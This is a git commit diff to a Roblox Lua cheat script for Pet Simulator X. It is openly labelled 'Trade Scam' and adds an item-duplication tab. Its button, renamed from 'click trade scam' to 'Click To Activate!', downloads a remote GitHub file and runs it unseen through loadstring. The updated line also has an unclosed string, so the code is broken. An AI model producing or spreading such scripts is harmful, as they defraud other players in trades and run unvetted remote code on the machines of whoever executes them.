8e227dc3206e457e4b64c9ed29e6e29e7847fbc4
Maset0 <120063355+Maset0@users.noreply.github.com>
2022-12-08 13:25:21 +0200

    Update RobloxScript1.lua

--- RobloxScript1.lua
+++ RobloxScript1.lua
@@ -1,11 +1,14 @@
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/Maset0/Roblox/main/script.lua"))()
-local Window = Library.CreateLib("Trade Scam Pet Simulator X", "Midnight")
+local Window = Library.CreateLib("PSX 8888 HUB", "Midnight")
 
 --MAIN
 local Main = Window:NewTab("Trade Scam")
-local MainSection = Main:NewSection("trade Scam")
+local MainSection = Main:NewSection("Trade Scam")
+
+local Dupe = Window:NewTab("Dupe")
+local DupeSection = Main:NewSection("PSX-Dupe")
 
 
-MainSection:NewButton("click trade scam", "Script BY Scriptpsx", function()
+MainSection:NewButton("Click To Activate!", "Script BY 8888 Team!, function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/Maset0/dsdsdsd/main/info.lua"))()
 end)
